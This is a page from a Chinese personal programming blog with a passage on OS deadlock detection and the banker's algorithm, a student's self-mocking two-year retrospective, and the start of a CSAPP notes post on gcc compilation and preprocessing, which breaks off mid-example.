</blockquote>
<blockquote>
<p>显然死锁的概念也适用于线程集合上</p>
</blockquote>
</blockquote>
<h3 id="建模表示">建模表示</h3>
<h4 id="线程图建模">线程图建模</h4>
<p>用线程图表示这个事情:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220601210209517.png"
alt="image-20220601210209517" />
<figcaption aria-hidden="true">image-20220601210209517</figcaption>
</figure>
<p>禁止区即<code>s,t</code>资源剩余数量为-1的区域,这显然是不可能的</p>
<p>当两个线程都互补想让争抢资源,并且争抢资源
的顺序不对时,就容易发生死锁</p>
<p>图中死锁区域的状态就是:</p>
<p>线程1已经抢到了s,并且吃里扒外想要抢夺t</p>
<p>线程2已经抢到了t,并且吃里扒外想要抢夺s</p>
<p>双方都有对方想要的东西但是双方都不打算交出自己的资源,于是两个线程都无限忙等</p>
<p>在线程图上由于状态转移只能向右或者向上转移(时间的推移方向)</p>
<p><strong>而死锁区就是右侧核上侧被禁止区完全挡住的区域</strong></p>
<h4 id="有向图建模">有向图建模</h4>
<p>图片来自<code>&lt;&lt;MOS&gt;&gt;</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220601211535232.png"
alt="死锁的有向图建模" />
<figcaption aria-hidden="true">死锁的有向图建模</figcaption>
</figure>
<p>圆圈⭕节点表示的是进程(或者说线程),</p>
<p>方框节点表示的是资源,</p>
<p>资源R指向进程A的有向边,表示进程A已经占有资源R</p>
<p>进程B指向资源S的有向边,表示进程B需要得到资源S</p>
<p>这里的最大资源数量就可以不只有1个了,比如T资源有两个就可以画两个方框,通过合理安排(也不用安排,显然的事情)就可以解决死锁</p>
<p>当一个资源分配图上的一些圆圈方框连接成一个圈时(圈上的箭头同逆时针或者同顺时针),就产生了死锁</p>
<blockquote>
<p>如果资源数量为1时,发生死锁就是一辈子的死锁</p>
<p>如果资源数量大于1,则死锁有可能是暂时的,比如本例中的T资源,要是存在另一个T资源,就可以解燃眉之急</p>
</blockquote>
<h3 id="死锁的判断">死锁的判断</h3>
<h4 id="互斥锁死锁的判断">互斥锁死锁的判断</h4>
<h5 id="无死锁的充分条件">无死锁的充分条件</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220601221022640.png"
alt="image-20220601221022640" />
<figcaption aria-hidden="true">image-20220601221022640</figcaption>
</figure>
<p><code>&lt;&lt;MOS&gt;&gt;</code>上举的例子</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220601221103392.png"
alt="image-20220601221103392" />
<figcaption aria-hidden="true">image-20220601221103392</figcaption>
</figure>
<p>啥意思呢?比如线程(或者进程)A和线程B都要使用1和2两种资源</p>
<p>那么线程A和B都应该按照申请1,申请2,释放2,释放1或者申请2,申请1,释放1,释放2这种顺序</p>
<p>否则如图b,<strong>可能</strong>会产生A申请到1同时B申请到2,此后两个进程就都没有进展了.注意这里说法是可能,也有可能A进程执行完毕才轮到B进程执行,此时就没有死锁</p>
<h5 id="充要条件">充要条件</h5>
<p>资源图上只要没有强联通分量(圈上的箭头同方向)则不是死锁</p>
<p>资源图上只要是有强连通分量就有死锁</p>
<blockquote>
<p>甚至可以复习一下塔杨算法求scc</p>
</blockquote>
<h4 id="计数锁死锁的判断">计数锁死锁的判断</h4>
<h5 id="存在死锁的充分条件">存在死锁的充分条件</h5>
<p><code>&lt;&lt;MOS&gt;&gt;</code>给出的算法</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220601224743929.png"
alt="image-20220601224743929" />
<figcaption aria-hidden="true">image-20220601224743929</figcaption>
</figure>
<blockquote>
<p>符号意义:</p>
<p>现有资源数量表示某种资源的最大数量,包括已用的和没用的</p>
<p>可用资源数量表示某种资源还没有被进程占用的资源</p>
<p>设共有n种资源,编号1到n</p>
<p>现有资源向量<span
class="math inline">\(\bold{E}=\{E_1,E_2,...,E_n\}\)</span>,其中<span
class="math inline">\(E_i\)</span>表示第i种资源的总数量(包括已占用的和未占用的)</p>
<p>可用资源向量<span
class="math inline">\(\bold{A}=\{A_1,A_2,...,A_n\}\)</span>,其中<span
class="math inline">\(A_i\)</span>表示第i种资源的可用数量(尚未被占用的数量)</p>
<p>当前分配矩阵 <span class="math display">\[
\bold{M}=
\begin{bmatrix}
  \bold{C_1}\\
  \bold{C_2}\\
  ...\\
  \bold{C_n}
\end{bmatrix}
=
\begin{bmatrix}
  C_{11}\ C_{12}\ ...\ C_{1n}\\
  C_{21}\ C_{22}\ ...\ C_{2n}\\
  ...\\
  C_{n1}\ C_{n2}\ ...\ C_{nn}
\end{bmatrix}
\]</span> 其中每一行都是一个向量<span
class="math inline">\(\bold{C_i}\)</span>表示第i个进程已经占有的资源向量</p>
<p>请求矩阵 <span class="math display">\[
\bold{Q}=
\begin{bmatrix}
  \bold{R_1}\\
  \bold{R_2}\\
  ...\\
  \bold{R_n}
\end{bmatrix}
=
\begin{bmatrix}
  R_{11}\ R_{12}\ ...\ R_{1n}\\
  R_{21}\ R_{22}\ ...\ R_{2n}\\
  ...\\
  R_{n1}\ R_{n2}\ ...\ R_{nn}
\end{bmatrix}
\]</span> 其中每行都是一个向量<span
class="math inline">\(\bold{R_i}\)</span>表示第i个进程还需要的资源向量(资源请求向量)</p>
<p>定义两个向量的抽象代数关系: <span class="math display">\[
\bold{U}@ \bold{V}\Leftrightarrow \forall i\in[1,n],U_i@ V_i
\]</span> 比如小于等于关系 <span class="math display">\[
\bold{U}\le \bold{V}\Leftrightarrow \forall i\in[1,n],U_i\le V_i
\]</span> 即U的每一项都要小于等于V的每一项,则向量<span
class="math inline">\(\bold{U}\le\bold{V}\)</span></p>
</blockquote>
<p>死锁检查算法:</p>
<p>遍历<span class="math inline">\(\bold{Q}\)</span>矩阵,用<span
class="math inline">\(\bold{A}\)</span>向量与<span
class="math inline">\(\bold{Q}\)</span>的所有行向量进行比较,如果存在<span
class="math inline">\(\bold{R_i}\le \bold{A_i}\)</span>,则<span
class="math inline">\(\bold{A}=\bold{A}+\bold{C_i}\)</span>,并且将<span
class="math inline">\(\bold{R_i}\)</span>置0,下一次遍历时不再考虑第i行</p>
<p>重复上述步骤,</p>
<p>如果<span class="math inline">\(\bold
Q\)</span>矩阵的所有行都可以被消去,则通过消去的方法分配资源是不存在死锁的.不按照消去方法就有可能产生死锁</p>
<p>如果<span
class="math inline">\(\bold{Q}\)</span>矩阵就是有几行消不去,则一定有死锁产生</p>
<h3 id="死锁的避免">死锁的避免</h3>
<p>银行家算法:</p>
<h4 id="单个资源的银行家算法">单个资源的银行家算法:</h4>
<p>总是挑选当前需要资源数最少的进程先分配资源并执行,待该进程执行完毕后回收其资源,壮大银行资本</p>
<blockquote>
<p>如果资源需求量最少的进程都没法满足,那么已经产生了死锁</p>
</blockquote>
<h4 id="多个资源的银行家算法">多个资源的银行家算法</h4>
<p>实际上该算法刚才我们已经学习过了,计数锁的判断时的消去方法就应用了银行家算法:</p>
<blockquote>
<p>总是挑软柿子捏</p>
</blockquote>
<p>总是挑选当前能够满足资源要求的进程首先执行,并在其执行完后获取其原本占有的资源,壮大银行资本</p>
<blockquote>
<h2 id="mos的段子手">MOS的段子手</h2>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220601231623980.png"
alt="image-20220601231623980" />
<figcaption aria-hidden="true">image-20220601231623980</figcaption>
</figure>
<blockquote>
<p>"似乎只是为了让一些图论家有事可做罢了"</p>
</blockquote>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/05/27/birth/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/27/birth/" class="post-title-link" itemprop="url">Imperial March!</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-27 22:28:00" itemprop="dateCreated datePublished" datetime="2022-05-27T22:28:00+08:00">2022-05-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-06-04 22:23:02" itemprop="dateModified" datetime="2022-06-04T22:23:02+08:00">2022-06-04</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>别天天提你那"Imperial March"整的自己真和维达这么牛逼似的.</p>
<p>你就是一风暴兵,你也配有个性?</p>
<p>学习学成这个熊样子,你也配觉得自己是个东西?</p>
<p>你是有多闲啊,还tm想拥有爱情?</p>
<p>你清高你了不起,看不起刷抖音的,你自己倒是B站刷一天</p>
<p>你笑话人家LSP,转头自己一个人的时候就看人家跳舞</p>
<p>打算法竞赛的时候你自我感动自以为学了多少东西,多少东西?校赛一考你什么都不是</p>
<p>你天天熬夜觉得自己多卷了多少东西似的,还不是刷B站玩游戏了?</p>
<p>你坐教室里学了不到一个小时就觉得自己满了,CSAPP一章你能看一个星期,你是王八还是蜗牛啊?</p>
<p>天天骂学校课程安排的不合理,你倒是自己有思路有明确方向啊?</p>
<p>天天看不起学英语的学政治的,你也六级优秀啊?你也玩个权术啊?</p>
<p>你能吗?</p>
<p>你是谁啊?</p>
<p>你什么都不是,你没牌面</p>
<p>你满肚子里的骄傲屁哪怕自己咽回去也比放出来恶心人家强!</p>
<p>你该干啥干啥!你永远是个风暴兵!你不是什么绝地武士!你就是个垃圾!</p>
<p>你还有一年就得决定本科的去向了!你现在是刀殂上的死鱼烂虾!</p>
<p>你下面的总结,笑死,自我感动罢了</p>
<p>你也配过生日?</p>
<p>你醒醒吧!</p>
<h1 id="imperial-march">Imperial March</h1>
<p>天临4年(或改元卢雷元年)夏肆月廿伍,球过其而立生日,因缺思厅,时值大二下期末,回顾其两年大学过活有感,作此总结</p>
<p>期末将近,本学期的学习又进入收官阶段,好像本学期初的上学期期末考试才刚发生过.</p>
<p>白驹过隙,时间像<a
target="_blank" rel="noopener" href="https://music.163.com/#/song?id=29734863">Mountains</a>里频率逐渐加快的时钟滴答.</p>
<p>眨眼之间,时钟已经快如脉搏,巨浪已如秦岭般近在眼前</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/793E2A715B3B08FCA69FBFFE1CD38551.jpg"
alt="阳台·秦岭" />
<figcaption aria-hidden="true">阳台·秦岭</figcaption>
</figure>
<p>在过去的两年里,球子都经历了啥呢?</p>
<h2 id="n个id">n个id</h2>
<p><strong>shockwave</strong></p>
<blockquote>
<p>abandoned,那时候我还是个变形金刚G1大波粉</p>
</blockquote>
<p><strong>野心勃勃的帝国球</strong></p>
<blockquote>
<p>abandoned,太过于中二,让人笑话</p>
</blockquote>
<p><strong>死灰复燃的帝国球</strong></p>
<blockquote>
<p>abandoned,有点政治敏感,德棍打死</p>
</blockquote>
<p><strong>deutschball</strong></p>
<blockquote>
<p>using,波兰球漫画爱好者,但实际上是政治白痴</p>
</blockquote>
<p><strong>dustball</strong></p>
<blockquote>
<p>using,在大一下刚认识伍幺零时她认为我的id</p>
</blockquote>
<p><strong>灰球球</strong></p>
<blockquote>
<p>using,dustball的翻译,叠词者,恶心也</p>
</blockquote>
<h2 id="三个方向">三个方向</h2>
<p>两年的大学生活波澜壮阔</p>
<p>大一时还天真地认为自己是个算法竞赛的料,最终在校赛之时才发现自己不过学了ACMer和OIer的皮毛上的一根毛</p>
<p>大二上惊叹于HTML5网页的精美与微信小程序的便携快捷,好像就认定以后要做前端</p>
<p>大二下却又转变方向改学网络安全,又学了CTFer身上的一根毛</p>
<p>每个方向都带给我新鲜感,都让我感叹算法的精妙与工业的美丽</p>
<h2 id="两台机器">两台机器</h2>
<p>两年来最默默无闻的伙伴莫过于两台计算机,还有计算机上天天打交道的各种软件</p>
<p>一台DELL Vostro 3583,我称它为Commando,现在已经退休作为靶场了</p>
<p>一台Lenovo LEGION Y9000P2021H,我称它为Executor</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220527214030953.png"
alt="image-20220527214030953" />
<figcaption aria-hidden="true">image-20220527214030953</figcaption>
</figure>
<p>最初只有一个软件朋友Dev-CPP,后来Typora,WPS,VScode等等伙计齐聚一堂</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220527214116346.png"
alt="image-20220527214116346" />
<figcaption aria-hidden="true">image-20220527214116346</figcaption>
</figure>
<p>从前,喜怒哀乐只能和它们聊,它们也只会听.只有程序给出的唯一的输出,能让我感到百分百的安全感.</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220527215958751.png"
alt="image-20220527215958751" />
<figcaption aria-hidden="true">image-20220527215958751</figcaption>
</figure>
<p>解决程序的报错或者纠正算法的错误,能让我感到帮助一个朋友解决问题的成就感.</p>
<p>把各个工具加入到Executor的环境变量path然后把vscode作为Executor的舰桥,通过终端向Executor发号施令.这让我感到朋友们齐聚一堂的热闹</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220527215136408.png"
alt="image-20220527215136408" />
<figcaption aria-hidden="true">image-20220527215136408</figcaption>
</figure>
<p>探索VScode,Typora的各种功能,让我感觉这是在了解朋友们的更多方面...</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220527214304580.png"
alt="typora sequence" />
<figcaption aria-hidden="true">typora sequence</figcaption>
</figure>
<h2 id="一群兄弟">一群兄弟</h2>
<p>我们越来越熟悉,成为同一条壕沟里的战友.</p>
<p>我们相互<code>define</code>绰号,被随意组CP却没有人生气.</p>
<p>我们心有灵犀,一呼百应去码头给兄弟过生日</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/m.jpg"
alt="m" />
<figcaption aria-hidden="true">m</figcaption>
</figure>
<p>我们资料共享,兄弟之间没有猜忌</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220527214949645.png"
alt="image-20220527214949645" />
<figcaption aria-hidden="true">image-20220527214949645</figcaption>
</figure>
<p>我们敢于争先,比先进不比摆烂,软卓的名号在软工日益响亮.</p>
<p>我们潜力无限,未来可期.</p>
<p>虽然我们即将散作满天星,但是我们聚如一团火.</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/%E8%BD%AF%E5%8D%93.jpg"
alt="软卓" />
<figcaption aria-hidden="true">软卓</figcaption>
</figure>
<h2 id="一本好书">一本好书</h2>
<p>那必须是相见恨晚的CSAPP.</p>
<p>如果能重来,我一定在大一的时候把这本书翻个西巴烂,</p>
<p>这样在我大二学C++的时候不至于连个源头文件干啥都不知道.</p>
<p>在我学操作系统的时候不至于连个虚拟内存技术都不知道.</p>
<p>在我学计算机组成原理的时候不至于连个寻址方式都不知道.</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220527213322734.png"
alt="image-20220527213322734" />
<figcaption aria-hidden="true">image-20220527213322734</figcaption>
</figure>
<p>在这本书上值得下大功夫多敲代码多做实验</p>
<p><a target="_blank" rel="noopener" href="https://dustball.top/2022/05/23/汇编语言/">CSAPP-chapter3
x86-64汇编语言 | Deutschball's blog (dustball.top)</a></p>
<p><a target="_blank" rel="noopener" href="https://dustball.top/2022/05/27/链接/">CSAPP-chapter7 链接 |
Deutschball's blog (dustball.top)</a></p>
<p><a target="_blank" rel="noopener" href="https://dustball.top/2022/05/23/异常/">CSAPP-chapter8
异常与进程 | Deutschball's blog (dustball.top)</a></p>
<p><a target="_blank" rel="noopener" href="https://dustball.top/2022/05/17/虚拟内存/">CSAPP-chapter9
虚拟内存 | Deutschball's blog (dustball.top)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/05/27/%E9%93%BE%E6%8E%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/27/%E9%93%BE%E6%8E%A5/" class="post-title-link" itemprop="url">CSAPP-chapter7 链接</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-27 12:20:00" itemprop="dateCreated datePublished" datetime="2022-05-27T12:20:00+08:00">2022-05-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-03-09 20:50:49" itemprop="dateModified" datetime="2024-03-09T20:50:49+08:00">2024-03-09</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本文的typora onedark风格见:<a
target="_blank" rel="noopener" href="https://dustball.top/HTML/linkage.html">linkage</a></p>
<h1 id="链接">链接</h1>
<p>win11+vscode+wsl</p>
<p>链接是对.o,.a,.so而言的,在此之前要先经过编译,即程序从源代码.c文件编译成目标文件.o</p>
<h2 id="从.c到.o">从.c到.o</h2>
<h3 id="将要遭遇的概念">将要遭遇的概念</h3>
<p>GCC:(GNU Compiler Collection)GNU编译器集合</p>
<p>gcc和g++都属于"编译器驱动程序"(driver),实际上编译器是cc1(C语言),cc1plus(C++语言)</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@deutschball-virtual-machine:~/mydir# whereis gcc</span><br><span class="line">gcc: /usr/bin/gcc /usr/lib/gcc /usr/share/gcc /usr/share/man/man1/gcc.1.gz</span><br></pre></td></tr></table></figure>
<p>在linux系统上自带,可以用whereis 命令查询gcc的位置</p>
<p>我们实际调用的是第一个<code>/usr/bin/gcc</code></p>
<p>/usr目录:unix system
resources缩写,包含了所有共享文件,是unix系统最重要的目录之一</p>
<p>用户的家原来也在这里,但是现在改成了/home</p>
<p>/usr/bin目录:所有可执行文件,比如gcc,g++</p>
</blockquote>
<p>GAS:GNU汇编器（GNU
Assembler），简称为GAS.使用gcc命令时汇编器(as)和链接器(ld)都是GAS提供的</p>
<h3 id="gcc和g的区别">gcc和g++的区别</h3>
<p>包括但是不止下面两条</p>
<ol type="1">
<li></li>
</ol>
<p>gcc对于.c文件调用cc1编译器,对于.cpp文件调用cc1plus编译器</p>
<p>g++不管是.c和.cpp都会调用cc1plus编译器</p>
<ol start="2" type="1">
<li></li>
</ol>
<p>在链接时gcc==不会==传递给链接器链接C++标准库的命令但是g++会</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt;v;<span class="comment">//此处需要使用STL中的vector</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>比如这样一个test.cpp文件</p>
<p>使用gcc命令编译则会报错:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# gcc test.cpp -o test.out</span><br><span class="line">/usr/bin/ld: /tmp/ccfXp0Kz.o: <span class="keyword">in</span> <span class="keyword">function</span> `__gnu_cxx::new_allocator&lt;int&gt;::deallocate(int*, unsigned long)<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">test.cpp:(.text._ZN9__gnu_cxx13new_allocatorIiE10deallocateEPim[_ZN9__gnu_cxx13new_allocatorIiE10deallocateEPim]+0x20): undefined reference to `operator delete(void*)&#x27;</span></span><br><span class="line">/usr/bin/ld: /tmp/ccfXp0Kz.o:(.data.rel.local.DW.ref.__gxx_personality_v0[DW.ref.__gxx_personality_v0]+0x0): undefined reference to `__gxx_personality_v0<span class="string">&#x27;</span></span><br><span class="line"><span class="string">collect2: error: ld returned 1 exit status</span></span><br></pre></td></tr></table></figure>
<p>但是使用g++命令编译则不会报错</p>
<p>如果想让gcc命令编译时让链接器可以链接标准库可以使用命令行参数<code>-lstdc++</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# gcc test.cpp -o test.out -lstdc++</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但是即使加上该参数,使用gcc和g++对于.cpp的编译还是有区别的.</p>
<p>啥区别我现在不知道,也不想知道</p>
<p>因此现阶段在编译.c源代码时就用gcc命令,编译.cpp源代码时就用g++命令</p>
<h3
id="gcc命令行参数和.c到.exe的过程">gcc命令行参数和.c到.exe的过程</h3>
<figure>
<img
src="https://img-blog.csdnimg.cn/img_convert/441e2211a121079fdd5f07542a3b2313.png"
alt="image-20220401003811834" />
<figcaption aria-hidden="true">image-20220401003811834</figcaption>
</figure>
<figure>
<img
src="https://img-blog.csdnimg.cn/img_convert/6ade9eae51f7c18adf10e6905673a554.png"
alt="image-20220401003612021" />
<figcaption aria-hidden="true">image-20220401003612021</figcaption>
</figure>
<figure>
<img
src="https://img-blog.csdnimg.cn/img_convert/86a785b63483f768b90553bb2b84a6e6.png"
alt="image-20220331235005241" />
<figcaption aria-hidden="true">image-20220331235005241</figcaption>
</figure>
<h4 id="预编译-e">预编译-E</h4>
<p>预编译命令只能作用于源代码文件(.c,.cpp)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -E balabala.c</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpp balabala.c</span><br></pre></td></tr></table></figure>
<p>1.将所有include(包括库文件和自己写的文件)展开</p>
<p>2.替换所有的宏定义</p>
<p>比如</p>
<p>test.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> word;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">int</span> a=N;</span><br><span class="line">  word b=N;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用<code>gcc test.c -E</code>(使用<code>cpp test.c</code>作用相同)之后会将预编译内容打印到屏幕,但是不会生成.i文件</p>
<figure>
<img
src="https://img-blog.csdnimg.cn/img_convert/9bbf91702b485741525fd0e7657384e9.png"
alt="image-20220331222506965" />
<figcaption aria-hidden="true">image-20220331222506965</figcaption>
</figure>
<p>(截图仅为一小部分)</p>
<p>观察到<code>#define N 10</code>消失,N被10替换</p>
<p><code>typedef</code>起别名并不会被替换</p>
<p>使用-o命令行参数指定预编译生成文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpp test.c -o test.i</span><br></pre></td></tr></table></figure>
<p>然后使用<code>ls -sh -l</code>名令以列表方式查看当前目录下文件大小</p>
<figure>
<img
src="https://img-blog.csdnimg.cn/img_convert/213bf06d5c5260f55778c0ad5cb99876.png"
alt="image-20220331224027046" />
<figcaption aria-hidden="true">image-20220331224027046</figcaption>
</figure>
<p>可见.i文件明显比.c文件大</p>
<h5 id="i命令行参数指定自定义头文件">-I命令行参数指定自定义头文件</h5>
<p><strong>如果需要包含的头文件和就在当前目录下则自动包含,</strong></p>
<p>比如当前目录(mydir/)下</p>
<p>有一个自定义头文件<code>myheader.h</code>里面只有一个变量a的定义</p>
<p>有一个test.c里面没有定义a直接拿来用</p>
<p>此时预编译是可以通过的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir<span class="meta"># ls -l</span></span><br><span class="line">总用量 <span class="number">8</span></span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root <span class="number">10</span> <span class="number">3</span>月  <span class="number">31</span> <span class="number">22</span>:<span class="number">43</span> myheader.h</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root <span class="number">51</span> <span class="number">3</span>月  <span class="number">31</span> <span class="number">22</span>:<span class="number">44</span> test.c</span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir<span class="meta"># cpp test.c -o test.i</span></span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir<span class="meta"># cat test.i</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;test.c&quot;</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;&lt;built-in&gt;&quot;</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;&lt;command-line&gt;&quot;</span></span><br><span class="line"># <span class="number">31</span> <span class="string">&quot;&lt;command-line&gt;&quot;</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;/usr/include/stdc-predef.h&quot;</span> <span class="number">1</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"># <span class="number">32</span> <span class="string">&quot;&lt;command-line&gt;&quot;</span> <span class="number">2</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;test.c&quot;</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;myheader.h&quot;</span> <span class="number">1</span></span><br><span class="line"><span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line"># <span class="number">2</span> <span class="string">&quot;test.c&quot;</span> <span class="number">2</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"> a;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>如果在其他目录则需要<code>- I &lt;directory&gt;</code>指定包含文件所在的目录</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# <span class="built_in">ls</span> -l</span><br><span class="line">总用量 8</span><br><span class="line">-rw-r--r-- 1 root root 10 3月  31 22:43 myheader.h</span><br><span class="line">-rw-r--r-- 1 root root 51 3月  31 22:44 test.c</span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# <span class="built_in">mv</span> myheader.h ..</span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# <span class="built_in">ls</span></span><br><span class="line">test.c</span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# cpp test.c</span><br><span class="line"><span class="comment"># 1 &quot;test.c&quot;</span></span><br><span class="line"><span class="comment"># 1 &quot;&lt;built-in&gt;&quot;</span></span><br><span class="line"><span class="comment"># 1 &quot;&lt;command-line&gt;&quot;</span></span><br><span class="line"><span class="comment"># 31 &quot;&lt;command-line&gt;&quot;</span></span><br><span class="line"><span class="comment"># 1 &quot;/usr/include/stdc-predef.h&quot; 1 3 4</span></span><br><span class="line"><span class="comment"># 32 